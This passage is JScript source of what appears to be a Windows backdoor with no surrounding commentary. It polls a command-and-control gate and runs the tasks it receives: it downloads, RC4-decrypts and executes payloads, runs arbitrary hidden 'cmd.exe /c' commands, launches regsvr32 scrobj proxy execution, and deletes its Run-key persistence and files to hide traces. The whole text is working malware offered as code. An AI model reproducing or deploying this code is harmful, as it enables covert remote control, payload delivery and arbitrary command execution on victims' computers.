	  adb.write(con3.responsebody);
	  
	  adb.position = 0;
	  adb.Type = 2;
	  adb.Charset = 437;
	  var binVariant = adb.ReadText();
	  
	  if (binVariant) {
	  
	  var ByteArray = tB(binVariant);
      var xDecrypted = rc4Bytes(ByteArray, rc4Key);
      
	  adb.position = 0;
      adb.type = 2;
      adb.Charset = 437;
      adb.writeText(tS(xDecrypted));
	  
	  adb.savetofile(SaveTo);
	  adb.close();
      ret3 = "OK";
	  } else {ret3 = "Error";}
	  } else {ret3 = "Error";}
  }
};

try{con3.send();}catch(e15){ret3 = "Error";}

return ret3;
}

var main_mitm = "regsvr32 /S /N /U /I:";
var second_mitm = " sCrobJ";
var mainCommand = main_mitm + js_gate + second_mitm;

function executeTask(FullTask){
var eState = "0";var TaskReply;var x1;var Note;var Sp;var UniqLocal;var tURL;var fPasw;
var flink;var ret77;var dq2;var tPE;
var UniqKey = ""; var uniqremote = "";

try{x1 = obj("WScript.Shell");} catch (e100){x1 = false;}

var tType = get_string_between(FullTask, "[task_type]", "[/task_type]");
var tID = get_string_between(FullTask, "[task_id]", "[/task_id]");

switch (tType){
  case "d&exec":
    flink = get_string_between(FullTask, "[url]", "[/url]");
	tPE = get_string_between(FullTask, "[petype]", "[/petype]");
	if(!tPE){tPE = "exe";}
	
	if (flink)
	{
	if (flink.indexOf(",") !== -1){
	Sp = flink.split(",");
	
	tURL = Sp[0];
	fPasw = Sp[1];
	
	
	if (tURL && fPasw)
	{
	if (dExec(tURL, fPasw, tPE) === "OK"){eState = "1";}
	}
	TaskReply = PreserveH + "[task_executed]" + eState + "[/task_executed][task_id]" + tID + "[/task_id]";
	hit_Gate(Gate, TaskReply, 0);
	}
	}
	break;
  case "more_eggs":
    flink = get_string_between(FullTask, "[url]", "[/url]");
	
	if (flink)
	{
	if (flink.indexOf(",") !== -1){
	Sp = flink.split(",");
	
	tURL = Sp[0];
	fPasw = Sp[1];
	
	if (tURL && fPasw)
	{
	try{
	Note = x1.RegRead(xStore);
    if(Note){
      if (Note.indexOf(",") !== -1){
      Sp = Note.split(",");
	  UniqLocal = xApp + "\\" + Sp[1] + ".txt";

	  if (fexist(UniqLocal) === true){deleteFile(UniqLocal);}
	  ret77 = wget(tURL, UniqLocal, fPasw);

	  if (ret77 === "OK"){
	     ret77 = "1";
	  } else{
	     ret77 = "0";
	  }
	  
      } else {ret77 = "0";}
    } else {ret77 = "0";}
	} catch(e12){ret77 = "0";}
	} else {ret77 = "0";}
	} else {ret77 = "0";}
	} else {ret77 = "0";}
	
	TaskReply = PreserveH + "[task_executed]" + ret77 + "[/task_executed][task_id]" + tID + "[/task_id]";
	hit_Gate(Gate, TaskReply, 0);
    break;
  case "gtfo":
    UniqKey = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\";
	try{
    Note = x1.RegRead(xStore);
    if(Note){
      if (Note.indexOf(",") !== -1){
      Sp = Note.split(",");
      UniqKey += Sp[0];
	  UniqLocal = xApp + "\\" + Sp[1] + ".txt";
	  uniqremote = xApp + "\\" + Sp[0] + ".txt";
	  
	  x1.RegDelete(xStore);
	  if (fexist(UniqLocal) === true){deleteFile(UniqLocal);}
	  if (fexist(uniqremote) === true){deleteFile(uniqremote);}
	  
	  ret77 = "1";
	  
      } else {ret77 = "0";}
    } else {ret77 = "0";}
	}catch(e13){ret77 = "0";}
	
	try{if (ret77 == "1"){x1.RegDelete(UniqKey);} else {x1.a();}
	} catch(ez1){x1.RegDelete("HKEY_CURRENT_USER\\Environment\\UserInitMprLogonScript");}
	  
	hit_Gate(Gate, PreserveH + "[task_executed]"+ret77+"[/task_executed][task_id]"+tID+"[/task_id]", 0);
	
	if (ret77 == "1"){gtfo = true;}
    break;
  case "more_onion":
 
	try{
	Note = x1.RegRead(xStore);
	if(Note){
		if (Note.indexOf(",") !== -1){
			Sp = Note.split(",");
			UniqLocal = xApp + "\\" + Sp[1] + ".txt";
	  
			if (fexist(UniqLocal) === true)
			{
				dq2 = "\x22";
				mainCommand = main_mitm + dq2 + UniqLocal + dq2 + second_mitm;
			}
	}
	}
	} catch(e1672){dq2 = "";}

	try{x1.run(mainCommand, 0, 0);ret77 = "1";} catch(e161) {ret77 = "0";}
	
	hit_Gate(Gate, PreserveH + "[task_executed]" + ret77 + "[/task_executed][task_id]"+tID+"[/task_id]", 0);
	
    if (ret77 == "1"){gtfo = true;}
    break;
  case "via_x":
    flink = get_string_between(FullTask, "[xyz]", "[/xyz]");
	
	if (flink)
	{
	
	try{x1.run("cmd.exe /c " + flink, 0, 0);eState = "1";} catch(e777) {eState = "0";}
	
	TaskReply = PreserveH + "[task_executed]" + eState + "[/task_executed][task_id]" + tID + "[/task_id]";
	hit_Gate(Gate, TaskReply, 0);
	
	}
    break;
}

}

function mainSkid(){
rcon_now += 1;
if (rcon_now >= rcon_max)
{

var note2;var uniqLocal2;var sp2;
var xSkid = obj("WScript.Shell");
var dq2 = "\x22";

try{
note2 = xSkid.RegRead(xStore);
if(note2){
 if (note2.indexOf(",") !== -1){
 sp2 = note2.split(",");
 
 uniqLocal2 = xApp + "\\" + sp2[2] + ".txt";
	  
 if (fexist(uniqLocal2) === true)
 {
 mainCommand = main_mitm + dq2 + uniqLocal2 + dq2 + second_mitm;
 }
	  
 }
 }
 } catch(ez12){dq2 = "";}

 try{xSkid.run(mainCommand, 0, 0);gtfo = true;} catch(e681){gtfo = false;}
 
} else {
var HitNow = hit_Gate(Gate, PreserveH, 1);

switch (HitNow) {
  case "GateError":
	  waitfor(error_retry);
      break;
  case "OK":
      break;
  default:
	  executeTask(HitNow);
}

}

if(gtfo === false){waitfor(hit_each);}
}

function cIn(){
var x1;var Note;var Sp;var uLoc = "";

try{
x1 = obj("WScript.Shell");
Note = x1.RegRead(xStore);

if (Note) {

if (Note.indexOf(",") !== -1) {

Sp = Note.split(",");

if (Sp.length === 2)
{
uLoc = myEnv("APPDATA") + "\\" + Sp[1] + ".txt";

if (fexist(uLoc) === false){return false;}

return true;
} else {return false;}

} else {return false;}
} else {return false;}

} catch(e89){return false;}

}

if (cIn() === true){mainSkid();}
